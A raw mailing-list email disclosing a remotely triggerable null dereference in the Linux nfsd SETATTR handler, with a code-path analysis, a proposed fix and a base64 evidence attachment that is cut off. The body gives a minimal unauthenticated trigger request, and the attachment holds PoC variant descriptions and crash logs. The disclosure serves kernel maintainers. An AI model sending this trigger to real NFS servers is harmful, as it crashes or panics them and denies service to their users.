Return-Path: <linux-nfs+bounces-22534-lists+linux-nfs=lfdr.de@vger.kernel.org>
Delivered-To: lists+linux-nfs@lfdr.de
Received: from mail.lfdr.de
	by mail.lfdr.de with LMTP
	id 5D7uE2FSLGp7PQQAu9opvQ
	(envelope-from <linux-nfs+bounces-22534-lists+linux-nfs=lfdr.de@vger.kernel.org>)
	for <lists+linux-nfs@lfdr.de>; Fri, 12 Jun 2026 20:39:29 +0200
X-Original-To: lists+linux-nfs@lfdr.de
Received: from sin.lore.kernel.org (sin.lore.kernel.org [104.64.211.4])
	by mail.lfdr.de (Postfix) with ESMTPS id 45A0167BCAD
	for <lists+linux-nfs@lfdr.de>; Fri, 12 Jun 2026 20:39:28 +0200 (CEST)
Authentication-Results: mail.lfdr.de;
	dkim=pass header.d=gmail.com header.s=20251104 header.b=WGJ1SY8C;
	spf=pass (mail.lfdr.de: domain of "linux-nfs+bounces-22534-lists+linux-nfs=lfdr.de@vger.kernel.org" designates 104.64.211.4 as permitted sender) smtp.mailfrom="linux-nfs+bounces-22534-lists+linux-nfs=lfdr.de@vger.kernel.org";
	dmarc=pass (policy=none) header.from=gmail.com;
	arc=pass ("subspace.kernel.org:s=arc-20240116:i=2")
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sin.lore.kernel.org (Postfix) with ESMTP id 7D931300D7BD
	for <lists+linux-nfs@lfdr.de>; Fri, 12 Jun 2026 18:38:08 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 66B8537D132;
	Fri, 12 Jun 2026 18:38:06 +0000 (UTC)
X-Original-To: linux-nfs@vger.kernel.org
Received: from mail-ed1-f49.google.com (mail-ed1-f49.google.com [209.85.208.49])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C8B8937C907
	for <linux-nfs@vger.kernel.org>; Fri, 12 Jun 2026 18:38:03 +0000 (UTC)
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781289486; cv=pass; b=O04JVeFqjfKkpAlSsJudvy0sAShsjrtW1lkUHlaXM3ClBeuiJ0++eGt3xX4FCIIBcLXVdrTgPbYjcmk3zg3gz7LFqA7rOXfLGhqzgXU3eZpurMq55vCS1myCjxqk+ZDDWJMq5NHaHej46AKi4snsAXMWK/XSJuKzu1F+RYhX5x0=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781289486; c=relaxed/simple;
	bh=XSkgKJ4f/FlymbPnEdQjjecOzD2ajKkV7qzyJ0cBe18=;
	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=DaDunt28jTHfOeZPfR8F5aBb5cplCmhmDymHaT6iOo/ysU57so77YMs9LK8KvHmUltQ1E8YY5dakKBTdg7XVwyMd/w0c6mSRrmUrqFw2HRFR9WX8KsBT8jPKDMC+ITKDBXrnU7HW31m1spGMzj6CC6yjoPKR7xVjIkw5o+3K+DY=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=WGJ1SY8C; arc=pass smtp.client-ip=209.85.208.49
Received: by mail-ed1-f49.google.com with SMTP id 4fb4d7f45d1cf-68e5f7c1131so2240600a12.2
        for <linux-nfs@vger.kernel.org>; Fri, 12 Jun 2026 11:38:03 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1781289482; cv=none;
        d=google.com; s=arc-20240605;
        b=kcFWtvZ+kLHkYRCbc6xmv+gTQgMgN2Wc9pZ5/qagtTJAHb+dJgFA/R1UIulWjk596G
         yUSRT9f3JR7ZNiHCbo+dsxf0RyMq1qYoRPosVilk/LwpHAq8L3lPdVjH82YMKWEHf6HY
         pYiUIEqM+mbleCLA+yH6QBa793/kZs40FYX7g42WV44i3skFo5rgEnkDuTnFWFuTci4L
         tbx1If7oUNNNSmPj7KUViFq9oNKwDIpfb5TxXs+JzySuAbp3DutquEmecGJtrIEYSspT
         vHLPQSYNQwO1zRC+ZswOBMyNnYwgDgs9ugSSePRK1S4q200ZCVxyzf+tV8BrO4uQZpj2
         vOqA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=cc:to:subject:message-id:date:from:mime-version:dkim-signature;
        bh=eXtlgp4sm0yZ1nwsE/OyZ6SyTSKT1+AygxduvQ1iR4E=;
        fh=+FVJdILqNyZPbaBALsOMYiJhMUVxdAHOMtgGvgUuzI8=;
        b=fkNEnKkGubGn7ew3hr+U4r4QOG9WN4BAMUn9D15Z7O1L8Ij4cNL+6VXCFzHRiFE5FA
         ybqDFIKzZ6Efzoh8lM7nNU7Uhu7PFvJlsaBwdyEcOYqqZsi+uKKQlidFfHd29BvQpv1w
         MxTpbGVpFtR79IlvtYTvh7xT2kAkLPk2fEYHuzw3MpS5csPAZDa+3ac1lB+fw7JELw2x
         a72e5Fb2Gccx/keypmmeQ0cxx1H2L73p6fWynIW/hyuJ+yZSIArLIPmUVUMjGNsGsZTx
         REvYT639qEZcLS7HyYVk+I/ZDtjdYNZKMucE644jL/tV7jnJmgAM6m2baThEemCmFBJN
         T1sg==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1781289482; x=1781894282; darn=vger.kernel.org;
        h=cc:to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=eXtlgp4sm0yZ1nwsE/OyZ6SyTSKT1+AygxduvQ1iR4E=;
        b=WGJ1SY8CyX03UA6mFFHIO2aQFs5X+s9j4QrtOT3Ydpy5+Is/ZFw0yjtbwzmkqBEpLy
         yu/wpZAKnwydSVHru6kZ8yhCJ6vib+IgK2KjCa99jD3P91kHgtP7IsAVE2atvVJZ/+5l
         zY72z+16tOvky1Q+kJQDBrwkcHMY5QWtgOehzwmfHGiQh55Trq8iGxmJlLXnpQNfxaE+
         SmfVyDjaxQAZ8R4ZbVzaIVAsTF0YvTAkg0Y2XpmK/hW8LGfuPoLEVApxQOjTs80E7rP3
         c1fxGS0lDFPaBmZoDh4XdEn1UpHSeDXpcWpQ+cs9XeUQkogp4mo3KCx3LZsoNXNUu2gW
         +Tcw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1781289482; x=1781894282;
        h=cc:to:subject:message-id:date:from:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=eXtlgp4sm0yZ1nwsE/OyZ6SyTSKT1+AygxduvQ1iR4E=;
        b=a6FMV+rDMfzU9PaLRJYvhU1lXygH3nXrV1ckcAosAPiT7vAyPAt5zGeXSZMb3hAwrb
         vuAHDEdQm6RB6TEooQ7M8nDqCe/0Fymxwo1w33Oo8UEbgK3+x4ZKwrjAiRVo6KLaiNNq
         iH1sQhzB5MafhFxcuBN7Cv8jQ45OnFXRXYpJoxgy+wrIlOsdZTwIFlXpzcc+GkZaztFn
         xarVjR1WE/fiVYRQT7OxheixCYJS6rUhQwXibcwHVru4b0Gx2ZCT4Cmuh/UrG7nGpP35
         di3pXLrgYZYyuROwxnAmkrBtcCqgQogmcUravTmrXNvl51bzaG1FMpD3Vhlf7P+fcx5r
         j49w==
X-Forwarded-Encrypted: i=1; AFNElJ/N/lssyFVGyRyWmFiY/eo9X63sM4etoZKUOGVMdLhNiMNT/NP0joIl9UYjdnG5mmkNEqpba+yBDKk=@vger.kernel.org
X-Gm-Message-State: AOJu0YzjiHiD2tU+BuEs7RNIcp5IZpxg6jWNmwq+yaLyUtzN/eJV/eRf
	0Z2aj+EEK3XNCaw+ETiaf/MjSFhtxsLb/vtJWvCWHvI74uuBBIxeactehJLd7y35JK0OZmtZN8I
	XQAW/wCanug6IKrkE0TZADMje9bg9Jtk=
X-Gm-Gg: Acq92OFq6lpMMjPqhM3eWPSMkP6CLGSDaf7RKOLa2sgNm+tumvRFye4kiWArbyD2Xg1
	iRqXj7CAN5RS0Ald1mpf9VcsGBqEYLI9s1ksYEBI2zfH+CWeTMBF3RCYiWfq4UK+6qoXFvUIq+s
	WRStWRHuVspTX32bbsJssUKCqc8hR3NtHBQJ1G2+p9FQDebIgh1KpMaMFKw0HMVSh09B/lCc7MH
	1++MbD6xhDnZl05FFjGQWIz1lwGJ4DLdkOMjUqgWnr7RkIFLF4NJmhJO+Yr0G2TL1EUDEgWy0+n
	ECOzrw==
X-Received: by 2002:a05:6402:40c9:b0:67c:6836:7b0a with SMTP id
 4fb4d7f45d1cf-69378a2f837mr2087000a12.23.1781289481876; Fri, 12 Jun 2026
 11:38:01 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-nfs@vger.kernel.org
List-Id: <linux-nfs.vger.kernel.org>
List-Subscribe: <mailto:linux-nfs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-nfs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
From: Nikol Kuklev <nikolk202@gmail.com>
Date: Fri, 12 Jun 2026 21:37:49 +0300
X-Gm-Features: AVVi8CdlpynYaNT-9zYdxW9_LtfTnM9gAz25j3O6eQ1HKpeByULTSBhHsabTePA
Message-ID: <CAM4XWym=NREGQ67b-ypADfJwemnF61dNyHp2LVMpkxphE_+dvQ@mail.gmail.com>
Subject: [SECURITY] nfsd: fix null dereference in nfsd4_setattr for deleg
 timestamp attrs
To: chuck.lever@oracle.com, jlayton@kernel.org
Cc: security@kernel.org, linux-nfs@vger.kernel.org
Content-Type: multipart/mixed; boundary="000000000000cf8723065412c631"
X-Rspamd-Action: no action
X-Spamd-Result: default: False [-2.06 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=2];
	DMARC_POLICY_ALLOW(-0.50)[gmail.com,none];
	R_DKIM_ALLOW(-0.20)[gmail.com:s=20251104];
	R_SPF_ALLOW(-0.20)[+ip4:104.64.211.4];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[multipart/mixed,multipart/alternative,text/plain,text/x-python-script];
	MIME_BASE64_TEXT(0.10)[];
	HAS_LIST_UNSUB(-0.01)[];
	RCVD_TLS_LAST(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	TAGGED_FROM(0.00)[bounces-22534-lists,linux-nfs=lfdr.de];
	FROM_HAS_DN(0.00)[];
	RCVD_COUNT_THREE(0.00)[4];
	MIME_TRACE(0.00)[0:+,1:+,2:+,3:~,4:+,5:+,6:~];
	FORGED_RECIPIENTS(0.00)[m:chuck.lever@oracle.com,m:jlayton@kernel.org,m:security@kernel.org,m:linux-nfs@vger.kernel.org,s:lists@lfdr.de];
	FORWARDED(0.00)[lists@lfdr.de];
	FORGED_SENDER(0.00)[nikolk202@gmail.com,linux-nfs@vger.kernel.org];
	FORGED_SENDER_MAILLIST(0.00)[];
	DKIM_TRACE(0.00)[gmail.com:+];
	RCPT_COUNT_THREE(0.00)[4];
	FREEMAIL_FROM(0.00)[gmail.com];
	FORGED_SENDER_FORWARDING(0.00)[];
	TO_DN_NONE(0.00)[];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[nikolk202@gmail.com,linux-nfs@vger.kernel.org];
	HAS_ATTACHMENT(0.00)[];
	ALIAS_RESOLVED(0.00)[];
	TAGGED_RCPT(0.00)[linux-nfs];
	FORGED_RECIPIENTS_FORWARDING(0.00)[];
	MID_RHS_MATCH_FROMTLD(0.00)[];
	MISSING_XM_UA(0.00)[];
	ASN(0.00)[asn:63949, ipnet:104.64.192.0/19, country:SG];
	DBL_BLOCKED_OPENRESOLVER(0.00)[mail.gmail.com:mid,sin.lore.kernel.org:rdns,sin.lore.kernel.org:helo,vger.kernel.org:from_smtp]
X-Rspamd-Server: lfdr
X-Rspamd-Queue-Id: 45A0167BCAD

--000000000000cf8723065412c631
Content-Type: multipart/alternative; boundary="000000000000cf8722065412c62f"

--000000000000cf8722065412c62f
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

HI :)
I hope you're doing well!
I would like to report a remotely triggerable null pointer dereference in
nfsd4_setattr(),
introduced by commit 7e13f4f8d27d ("nfsd: handle delegated timestamps in
SETATTR").

## Bug

When a SETATTR request includes FATTR4_WORD2_TIME_DELEG_ACCESS or
FATTR4_WORD2_TIME_DELEG_MODIFY in the attribute bitmap, nfsd4_setattr() set=
s
`deleg_attrs =3D true` and calls nfs4_preprocess_stateid_op() to validate t=
he
stateid. If the client uses the NFSv4 "one stateid" (0xFFFFFFFF...), the
call
returns nfs_ok without setting the output stid pointer - because
check_special_stateids() handles special stateids and returns early, and th=
e
output nfs4_stid is only set in the `if (s)` block after the `done:` label,
which is skipped when s=3D=3DNULL.

Back in nfsd4_setattr(), the `if (deleg_attrs)` block then unconditionally
dereferences st->sc_type at line 1253 (offset ~4 from NULL), causing a
kernel
oops.

Relevant code path (fs/nfsd/nfs4proc.c):

    struct nfs4_stid *st =3D NULL;           // initialized to NULL
    ...
    status =3D nfs4_preprocess_stateid_op(rqstp, cstate,
            &cstate->current_fh, &setattr->sa_stateid,
            flags, NULL, &st);             // st stays NULL for special
stateid
    if (status)
        goto out_err;

    if (deleg_attrs) {
        status =3D nfserr_bad_stateid;
        if (st->sc_type & SC_TYPE_DELEG) { // <-- NULL DEREFERENCE when
st=3D=3DNULL

Why ONE_STATEID always triggers: check_special_stateids() line 7141 returns
nfs_ok unconditionally when ONE_STATEID and (flags & RD_STATE) are both
true.
With FATTR4_WORD2_TIME_DELEG_ACCESS set, flags =3D WR_STATE | RD_STATE, so
this
path fires regardless of server state.

Trigger (minimal):

    COMPOUND [
        PUTROOTFH,
        SETATTR(
            stateid =3D 0xFFFFFFFF...FF,    # ONE_STATEID
            bmval   =3D [0, 0, 0x100000],   # FATTR4_WORD2_TIME_DELEG_ACCES=
S
            attrs   =3D nfstime4{0, 0}
        )
    ]

No authentication, delegation, or prior state is required. Any NFSv4 client
can trigger this against a server running kernel >=3D v6.14.

## Impact

- Kernel null pointer dereference =E2=86=92 oops in the nfsd worker thread
- On servers with panic_on_oops=3D1: full kernel panic and reboot
- Affected: all kernels from v6.14 through current mainline (7.1-dev)
- Note: partially overlapping commit 3952f1cbcbc4 ("nfsd: fix SETATTR
updates
  for delegated timestamps", Jul 2025) fixed timestamp vetting but did not
  address this null dereference

## Fix
Add a null guard before the dereference. Patch attached -
fix-setattr-null-deref.patch.

The semantics are already correct: a non-delegation stateid (including
special
stateids) should return nfserr_bad_stateid. The fix only prevents the crash=
.

I have a PoC script available if useful for testing.

Thanks,
Nikol

--000000000000cf8722065412c62f
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr">HI :)<br>I hope you&#39;re doing well!<div>I would like to=
 report a remotely triggerable null pointer dereference in nfsd4_setattr(),=
<br>introduced by commit 7e13f4f8d27d (&quot;nfsd: handle delegated timesta=
mps in<br>SETATTR&quot;).<br><br>## Bug<br><br>When a SETATTR request inclu=
des FATTR4_WORD2_TIME_DELEG_ACCESS or<br>FATTR4_WORD2_TIME_DELEG_MODIFY in =
the attribute bitmap, nfsd4_setattr() sets<br>`deleg_attrs =3D true` and ca=
lls nfs4_preprocess_stateid_op() to validate the<br>stateid. If the client =
uses the NFSv4 &quot;one stateid&quot; (0xFFFFFFFF...), the call<br>returns=
 nfs_ok without setting the output stid pointer - because<br>check_special_=
stateids() handles special stateids and returns early, and the<br>output nf=
s4_stid is only set in the `if (s)` block after the `done:` label,<br>which=
 is skipped when s=3D=3DNULL.<br><br>Back in nfsd4_setattr(), the `if (dele=
g_attrs)` block then unconditionally<br>dereferences st-&gt;sc_type at line=
 1253 (offset ~4 from NULL), causing a kernel<br>oops.<br><br>Relevant code=
 path (fs/nfsd/nfs4proc.c):<br><br>=C2=A0 =C2=A0 struct nfs4_stid *st =3D N=
ULL; =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 // initialized to NULL<br>=C2=A0 =
=C2=A0 ...<br>=C2=A0 =C2=A0 status =3D nfs4_preprocess_stateid_op(rqstp, cs=
tate,<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 &amp;cstate-&gt;current_=
fh, &amp;setattr-&gt;sa_stateid,<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A0 flags, NULL, &amp;st); =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 // st =
stays NULL for special stateid<br>=C2=A0 =C2=A0 if (status)<br>=C2=A0 =C2=
=A0 =C2=A0 =C2=A0 goto out_err;<br><br>=C2=A0 =C2=A0 if (deleg_attrs) {<br>=
=C2=A0 =C2=A0 =C2=A0 =C2=A0 status =3D nfserr_bad_stateid;<br>=C2=A0 =C2=A0=
 =C2=A0 =C2=A0 if (st-&gt;sc_type &amp; SC_TYPE_DELEG) { // &lt;-- NULL DER=
EFERENCE when st=3D=3DNULL<br><br>Why ONE_STATEID always triggers: check_sp=
ecial_stateids() line 7141 returns<br>nfs_ok unconditionally when ONE_STATE=
ID and (flags &amp; RD_STATE) are both true.<br>With FATTR4_WORD2_TIME_DELE=
G_ACCESS set, flags =3D WR_STATE | RD_STATE, so this<br>path fires regardle=
ss of server state.<br><br>Trigger (minimal):<br><br>=C2=A0 =C2=A0 COMPOUND=
 [<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 PUTROOTFH,<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0=
 SETATTR(<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 stateid =3D 0xFFFFFF=
FF...FF, =C2=A0 =C2=A0# ONE_STATEID<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =
=C2=A0 bmval =C2=A0 =3D [0, 0, 0x100000], =C2=A0 # FATTR4_WORD2_TIME_DELEG_=
ACCESS<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 attrs =C2=A0 =3D nfstim=
e4{0, 0}<br>=C2=A0 =C2=A0 =C2=A0 =C2=A0 )<br>=C2=A0 =C2=A0 ]<br><br>No auth=
entication, delegation, or prior state is required. Any NFSv4 client<br>can=
 trigger this against a server running kernel &gt;=3D v6.14.<br><br>## Impa=
ct<br><br>- Kernel null pointer dereference =E2=86=92 oops in the nfsd work=
er thread<br>- On servers with panic_on_oops=3D1: full kernel panic and reb=
oot<br>- Affected: all kernels from v6.14 through current mainline (7.1-dev=
)<br>- Note: partially overlapping commit 3952f1cbcbc4 (&quot;nfsd: fix SET=
ATTR updates<br>=C2=A0 for delegated timestamps&quot;, Jul 2025) fixed time=
stamp vetting but did not<br>=C2=A0 address this null dereference<br><br>##=
 Fix<br>Add a null guard before the dereference. Patch attached - fix-setat=
tr-null-deref.patch.</div><div><br>The semantics are already correct: a non=
-delegation stateid (including special<br>stateids) should return nfserr_ba=
d_stateid. The fix only prevents the crash.<br><br>I have a PoC script avai=
lable if useful for testing.<br><br>Thanks,<br>Nikol<br></div></div>

--000000000000cf8722065412c62f--
--000000000000cf8723065412c631
Content-Type: text/plain; charset="UTF-8"; name="evidence-nfsd-setattr-null-deref.txt"
Content-Disposition: attachment; 
	filename="evidence-nfsd-setattr-null-deref.txt"
Content-Transfer-Encoding: base64
Content-ID: <f_mqb9kytr0>
X-Attachment-Id: f_mqb9kytr0

RklORElORy0wMDE6IE5VTEwgcHRyIGRlcmVmIGluIG5mc2Q0X3NldGF0dHIoKSB2aWEgVElNRV9E
RUxFR19BQ0NFU1MgKyBzcGVjaWFsIHN0YXRlaWQKPT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09CgpWRVJESUNUOiBWVUxORVJBQkxFIOKAlCBrZXJuZWwgTlVMTCBwb2ludGVyIGRlcmVmZXJl
bmNlIGNvbmZpcm1lZAoKS2VybmVsOiAgNi4xNy44LW9yYnN0YWNrLTAwMzA4LWc4ZjljOTQxMTIx
YjEgKEFSTTY0LCBTTVAsIFBSRUVNUFRMQVpZKQpIb3N0IE9TOiBtYWNPUyAyNS41LjAgLyBPcmJT
dGFjawpEYXRlOiAgICAyMDI2LTA2LTEyCgpBdHRhY2sKLS0tLS0tClBvQzogICAgIHRvb2xzL3Bv
Y19zZXRhdHRyX251bGxfZGVyZWYucHkgLS1zZXJ2ZXIgMTI3LjAuMC4xIC0tcG9ydCAxMjA0OQpU
cmlnZ2VyOiBDT01QT1VORCBbIFBVVFJPT1RGSCwgU0VUQVRUUihPTkVfU1RBVEVJRCwge2JtdmFs
Mj0weDEwMDAwMCwgbmZzdGltZTR7MCwwfX0pIF0KClRoZSBQb0Mgc2VuZHMgdGhyZWUgdmFyaWFu
dHM6CiAgVjE6IEZBVFRSNF9XT1JEMl9USU1FX0RFTEVHX0FDQ0VTUyAoYm12YWwyPTB4MTAwMDAw
KSArIE9ORV9TVEFURUlEICgweEZGLi4uRkYpCiAgVjI6IEZBVFRSNF9XT1JEMl9USU1FX0RFTEVH
X01PRElGWSAoYm12YWwyPTB4MjAwMDAwKSArIE9ORV9TVEFURUlECiAgVjM6IEZBVFRSNF9XT1JE
Ml9USU1FX0RFTEVHX0FDQ0VTUyArIFpFUk9fU1RBVEVJRCAoMHgwMC4uLjAwKQoKQWxsIHRocmVl
IHRyaWdnZXJlZCBrZXJuZWwgcGFuaWNzIChPcmJTdGFjayBWTSByZXN0YXJ0ZWQgZWFjaCBydW4p
LgoKS2VybmVsIE9vcHMgKGNhcHR1cmVkIGZyb20gL2Rldi9rbXNnIG9uIGtlcm5lbCA2LjE3Ljgp
Ci0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0K
VW5hYmxlIHRvIGhhbmRsZSBrZXJuZWwgTlVMTCBwb2ludGVyIGRlcmVmZXJlbmNlIGF0IHZpcnR1
YWwgYWRkcmVzcyAwMDAwMDAwMDAwMDAwMDA0Ck1lbSBhYm9ydCBpbmZvOgogIEVTUiA9IDB4MDAw
MDAwMDA5NjAwMDAwNwogIEVDID0gMHgyNTogREFCVCAoY3VycmVudCBFTCksIElMID0gMzIgYml0
cwogIFNFVCA9IDAsIEZuViA9IDAKICBFQSA9IDAsIFMxUFRXID0gMAogIEZTQyA9IDB4MDc6IGxl
dmVsIDMgdHJhbnNsYXRpb24gZmF1bHQKRGF0YSBhYm9ydCBpbmZvOgogIElTViA9IDAsIElTUyA9
IDB4MDAwMDAwMDcsIElTUzIgPSAweDAwMDAwMDAwCiAgQ00gPSAwLCBXblIgPSAwLCBUbkQgPSAw
LCBUYWdBY2Nlc3MgPSAwCiAgR0NTID0gMCwgT3ZlcmxheSA9IDAsIERpcnR5Qml0ID0gMCwgWHMg
PSAwCnVzZXIgcGd0YWJsZTogNGsgcGFnZXMsIDQ4LWJpdCBWQXMsIHBnZHA9MDAwMDAwMDExNzFi
NDAwMApbMDAwMDAwMDAwMDAwMDAwNF0gcGdkPTA4MDAwMDAxMTcxZDI0MDMsIHA0ZD0wODAwMDAw
MTE3MWQyNDAzLCBwdWQ9MDgwMDAwMDExNzFkMzQwMywgcG1kPTA4MDAwMDAxMDBhOTE0MDMsIHB0
ZT0wMDAwMDAwMDAwMDAwMDAwCkludGVybmFsIGVycm9yOiBPb3BzOiAwMDAwMDAwMDk2MDAwMDA3
IFsjMV0gIFNNUApNb2R1bGVzIGxpbmtlZCBpbjoKQ1BVOiA1IFVJRDogMCBQSUQ6IDUxMzQgQ29t
bTogbmZzZCBOb3QgdGFpbnRlZCA2LjE3Ljgtb3Jic3RhY2stMDAzMDgtZzhmOWM5NDExMjFiMSAj
MSBQUkVFTVBUTEFaWQpIYXJkd2FyZSBuYW1lOiBvcmJzdGFjayx2aXJ0IChEVCkKcHN0YXRlOiA2
MTQwMDAwNSAoblpDdiBkYWlmICtQQU4gLVVBTyAtVENPICtESVQgLVNTQlMgQlRZUEU9LS0pCnBj
IDogbmZzZDRfc2V0YXR0cisweDljLzB4MzIwCmxyIDogbmZzZDRfc2V0YXR0cisweDkwLzB4MzIw
CnNwIDogZmZmZjAwMDBkMzEwYmMxMAp4Mjk6IGZmZmYwMDAwZDMxMGJjNjAgeDI4OiAwMDAwMDAw
MDAwMDAwMDAwIHgyNzogZmZmZmJlYzBhODg2OTc4OAp4MjY6IGZmZmYwMDAwYjQ4NTBjMjggeDI1
OiBmZmZmMDAwMGQ0ODc5MTAwIHgyNDogMDAwMDAwMDAwMDEwMDAwMAp4MjM6IGZmZmYwMDAwZDc4
NGEzZTAgeDIyOiAwMDAwMDAwMDAwMDAwMDAwIHgyMTogZmZmZjAwMDBkNzg0YTNjMAp4MjA6IGZm
ZmYwMDAwYjQ4NTA4MDAgeDE5OiBmZmZmMDAwMGQ3ODRjMDI4IHgxODogMDAwMDAwMDAwMDAwMDAw
NAp4MTc6IDAwMDAwMDAwMDAwMDAxOWQgeDE2OiAwMDAwMDAwMDAwMDAwMDAxIHgxNTogMDAwMDAw
MDAwMDAwMDAwMAp4MTQ6IDAwMDAwMDAwMDAwMDAwMDAgeDEzOiAwMDAwMDAwMDAwMDAwMDAwIHgx
MjogZmZmZmZkZmZiZjU1ZDQ0MAp4MTE6IDAwMDAwMDAwMDAwMDAzNjAgeDEwOiBmZmZmMDAwMGE3
MTgzYzAwIHg5IDogM2RlMmI2NzUyZGI0OTYwMAp4OCA6IDNkZTJiNjc1MmRiNDk2MDAgeDcgOiAw
MDAwMDAwMDAwMDAwMDAwIHg2IDogZmZmZjAwMDBkMzEwYmMxOAp4NSA6IDAwMDAwMDAwMDAwMDAw
MDAgeDQgOiAwMDAwMDAwMDAwMDAwMDMwIHgzIDogZmZmZjAwMDBkNzg0YTNjMAp4MiA6IGZmZmYw
MDAwZDc4NGMwMjggeDEgOiBmZmZmMDAwMGQ3ODRjMDI4IHgwIDogMDAwMDAwMDAwMDAwMDAwMApD
YWxsIHRyYWNlOgogbmZzZDRfc2V0YXR0cisweDljLzB4MzIwIChQKQogbmZzZDRfcHJvY19jb21w
b3VuZCsweGNjLzB4MTQwCiBuZnNkX2Rpc3BhdGNoKzB4YjQvMHgyMzAKIHN2Y19wcm9jZXNzX2Nv
bW1vbisweDQ2OC8weDViOAogc3ZjX3Byb2Nlc3MrMHhkNC8weDE4OAogc3ZjX3JlY3YrMHg0Mzgv
MHhhZDAKIG5mc2QuY29sZCsweDY0LzB4YmMKCk9vcHMgYW5hbHlzaXMKLS0tLS0tLS0tLS0tLQot
IEZhdWx0IGFkZHJlc3M6IDB4MDAwMDAwMDAwMDAwMDAwNCA9IG9mZnNldCA0IGZyb20gTlVMTAot
IHgwID0gMHgwMDAwMDAwMDAwMDAwMDAwID0gdGhlIE5VTEwgJ3N0JyAobmZzNF9zdGlkKikgcG9p
bnRlcgotIHgxOCA9IDB4MDAwMDAwMDAwMDAwMDAwNCA9IGZhdWx0IFZBIGNvbmZpcm1pbmcgc3Qt
PnNjX3R5cGUgYWNjZXNzCi0geDI0ID0gMHgwMDAwMDAwMDAwMTAwMDAwID0gRkFUVFI0X1dPUkQy
X1RJTUVfREVMRUdfQUNDRVNTIGJpdCAoZGVsZWdfYXR0cnMgbWFzaykKLSBwYzogbmZzZDRfc2V0
YXR0cisweDljIG1hdGNoZXMgdGhlIHN0LT5zY190eXBlIGRlcmVmZXJlbmNlIGF0CiAgZnMvbmZz
ZC9uZnM0cHJvYy5jIGxpbmUgfjEyNTMKCnN0cnVjdCBuZnM0X3N0aWQgbGF5b3V0IChmcy9uZnNk
L3N0YXRlLmg6MTEyKToKICArMDogcmVmY291bnRfdCBzY19jb3VudCAoNCBieXRlcykKICArNDog
dW5zaWduZWQgc2hvcnQgc2NfdHlwZSAg4oaQIGFjY2Vzc2VkIGF0IGFkZHJlc3MgTlVMTCs0ID0g
MHg0ICDinJMKClBvQyBvdXRwdXQgKFZhcmlhbnQgMiB0cmlnZ2VyaW5nIGNyYXNoKQotLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpbKl0gVmFyaWFudCAyOiBGQVRUUjRf
V09SRDJfVElNRV9ERUxFR19NT0RJRlkgKyBPTkVfU1RBVEVJRAogICAgWyEhXSBDb25uZWN0aW9u
IHJlc2V0IOKAlCBzZXJ2ZXIgbGlrZWx5IGNyYXNoZWQhCgpPcmJTdGFjayBWTSByZXN0YXJ0ZWQg
YWZ0ZXIgZWFjaCB2YXJpYW50IChrZXJuZWwgcGFuaWMgd2l0aCBubyByZWNvdmVyeSkuCgpBZmZl
Y3RlZCB2ZXJzaW9ucwotLS0tLS0tLS0tLS0tLS0tLQpJbnRyb2R1Y2VkOiBjb21taXQgN2UxM2Y0
ZjhkMjdkYzAyZmI4ODY2NmY2MDNjNTNjYTc0OWQ1NmY5MgogICAgICAgICAgICAibmZzZDogaGFu
ZGxlIGRlbGVnYXRlZCB0aW1lc3RhbXBzIGluIFNFVEFUVFIiIChEZWMgOSwgMjAyNCkKUGFydGlh
bGx5IGZpeGVkOiBjb21taXQgMzk1MmYxY2JjYmM0IChKdWwgMzAsIDIwMjUpIGZpeGVkIHRpbWVz
